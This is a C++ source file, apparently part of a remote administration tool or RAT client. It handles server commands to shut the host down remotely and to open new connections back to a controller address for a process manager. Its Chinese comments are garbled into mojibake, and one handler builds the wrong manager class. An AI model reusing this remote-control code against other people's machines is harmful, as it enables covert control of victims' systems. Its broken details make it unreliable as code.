#include "pch.h"
#include "KernelManager.h"
#include"Common.h"
#include"dllmain.h"
#include"InstantMessageManager.h"
#include"SystemHelper.h"
#include"ProcessHelper.h"
#include"ProcessManager.h"
CKernelManager::CKernelManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	m_ThreadHandleCount=0;
	ZeroMemory(m_ThreadHandle, sizeof(HANDLE)*0x1000);
}
CKernelManager::~CKernelManager()
{

}

void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
		case CLIENT_GET_OUT_REQUIRE:
		{

			IsToken = CLIENT_GET_OUT_REPLY;

			m_IocpClient->OnSending((char*)&IsToken, 1);

			break;
		}
		case CLIENT_SHUT_DOWN_REQUIRE:
		{

			IsToken = CLIENT_SHUT_DOWN_REPLY;
			m_IocpClient->OnSending((char*)&IsToken, 1);
			Sleep(1);

			ZhEnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);     //TRUE��
			ShutdownSystem();
			ZhEnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);     //FALSE�ر�
			break;
		}
		case CLIENT_REMOTE_MESSAGE_REQUIRE:
		{

			//����һ���߳�
			m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)InstantMessageProcedure,                 //�̻߳ص��������������Ϊ���Ա����Ҫ����Ϊ��̬������Ϊȫ��
				NULL, 0, NULL);


			break;
		}
		case CLIENT_PROCESS_MANAGER_REQUIRE:
		{

			//����һ���߳�
			m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
				NULL, 0, NULL);

			break;
		}
	}
}
DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData)
{
	//����һ���µ�����
	CIocpClient	IocpClient;   //�µ�����

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))   //����һ���µ�����  while(�������� ��ѹ �� )  m_Manger->HandiO
		return -1;
	CProcessManager	ProcessManager(&IocpClient);




	IocpClient.WaitingForEvent();  //һ���¼��ȴ�����,��ֹ�����������
}

DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData)
{
	//����һ���µ�����
	CIocpClient	IocpClient;   //�µ�����

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))   //����һ���µ�����  while(�������� ��ѹ �� )  m_Manger->HandiO
		return -1;
	CProcessManager	ProcessManager(&IocpClient);




	IocpClient.WaitingForEvent();  //һ���¼��ȴ�����,��ֹ�����������
}
